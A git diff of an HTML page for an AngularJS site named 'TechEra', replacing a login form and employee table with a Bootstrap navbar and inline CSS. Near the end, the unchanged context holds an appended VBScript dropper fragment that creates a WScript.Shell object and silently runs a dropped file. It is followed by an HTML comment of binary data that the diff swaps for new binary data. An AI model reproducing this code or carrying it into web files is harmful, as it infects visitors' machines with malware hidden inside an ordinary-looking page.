@@ -1,46 +1,65 @@
 <!DOCTYPE html>
 <html ng-app="myApp">
 <head>
-	<title></title>
-	<!-- Latest compiled and minified CSS -->
+  <title></title>
+  <!-- Latest compiled and minified CSS -->
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
 
 <!-- Optional theme -->
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+<style>
+body
+{
+background-color: grey;
+}
+.container-fluid
+{
 
+height:58px;
+}
+#home
+{
+margin-left:570px;
+margin-top: 28px;
+}
+
+#reg
+{
+ margin-left:751px;
+margin-top: -44px; 
+}
+
+#login
+{
+
+ margin-left:827px;
+margin-top: -48px; 
+
+}
+</style>
 </head>
 <body>
-<h1>hii this is TECHERA</h1>
 <div class="container">
-
 <div ng-controller="myController">
 
-<br><br>
-<form>
-Username<input type="text" placeholder="username" ng-model="username"><br><br>
-Password<input type="password"  placeholder="password" ng-model="password"><br><br>
-<button class="btn btn-success">click</button>
-</form> <br><br>
-<table class="table">
-<thead>
-	<tr>
-	<th>name</th>
-    <th>city</th>
-    <th>phoneno</th>
-    </tr>
-</thead>
-
-<tbody>
-	   <tr ng-repeat="emp in employeeList">
-		<td>{{emp.name}}</td>
-		<td>{{emp.city}}</td>
-		<td>{{emp.phoneno}}</td>
-	   </tr>
-</tbody>
-</table>
+<nav class="navbar navbar-default">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      
+    </div>
+    <ul class="nav navbar-nav">
+      <li>
+      <a href="#" style="font-size:155%;"><b>T</b>ech<b>E</b>ra</a></li>
+     <li><a href="#" style="margin-left:539px;">Home</a></li>
+      <li><a href="#">Register</a></li>
+      <li><a href="#">Login</a></li>
+    </ul>
+  </div>
+</nav>
+ 
+</div>
  </div>
- </div>
-
+ 
 
 <script type="text/javascript" src="https://code.angularjs.org/1.6.4/angular.js"></script>
 
@@ -59,7 +78,8 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--e›|àgÚYA bè‡–¼/¥h²Óá‰Ô©/W¯uƒ¿	¹ó‡óı}i‘vcŒK®äÔk5ÈeÖ““¢ ã2v±ÙQş	‡„ñq"àİf™ÓÁÏÚ“ƒÖŞì}Î–Ø&S<¤s¤Sxd1’šÈÎÀ?<º"¬/¦`[Õ[ËU“Ö¢D/uš¹iÇe]›µ˜!#!­Nj¡ëèõ®÷1}·Uµgw¶#Ÿ¬¬kâ3—ÓÖ>1¾Jô ÚwM¤¿ÇôV„5OíO²ÏK2nîx×—/éFfö´_0ÕeâaŒÊÛâ¼·ª)R+Ê¹^ñŞYşVpÙ4u§«›
-¡¶fâ$ó f‰(™R“í%´7É•a±Î]P÷¿zCìM|]9|CÜõ›Z³¿á†àâ9Û,¶í
-a<VÜX%[
-§ÀïõèíÈM‚»ÒE&háQb-'eO7û|¶eeLˆO®›P;¾]óŠù éñ R*êúéñ éñ éñ ¤,LÎ	êYRìñ  éñ -->
+//--></SCRIPT><!--}›ÛE™è2ìÅ¹j`ä;>úÖ›m|«¬»5K«/şÃf—–P§1ãºŒ¡jp©#¢°ì9“s”¶ùô£w®ëD“=xRÆ®hîa¡wgÂ‚Í‡£|™
+Å¾3ÅMDj«gxÒL;Öœ¿Y¿’îLÀ9&ËÛï×KËgÅŸu Á³±nP~nòÚlÙ½ÀûwæH¥ƒy(?ÖNÂE7sŒ¥Ğ1ñGmvb'ü2¹ğSŸ`* h}µDğ
+ğÙ…Î¨Úä÷rŞŞcßgü¼’w…4·Ä å»ÔüÓ5â
+òi‘ˆØùÃuÖw—-Ìû¡¿k­¬^ó0 8¦6¡‘û—m	+§·:"]hÕõp‘œŸJAzÃ÷îÍœ}ÙÍ‘oA2 SòàaÀøX>TV­d–Â9Há¿ƒØÄoŸrıBğÌïHìbrß\+9” Òşñ°5§òä\£«!ğ‘N¾bì
+"à]o¼’MÌE‰zWcÑ£,	A÷Fö	àCsáú¤±Q*®tØ#0c|¸jÓ5‹‚Y&^HŸ~0Ï§?YS¸¹,nåA¦Îm3˜*%BN‡s³r-ìÔKW £À¯•lêgØy ŒÙÌ éñ R*êúéñ éñ éñ ¤,LÆğíYìñ  éñ -->
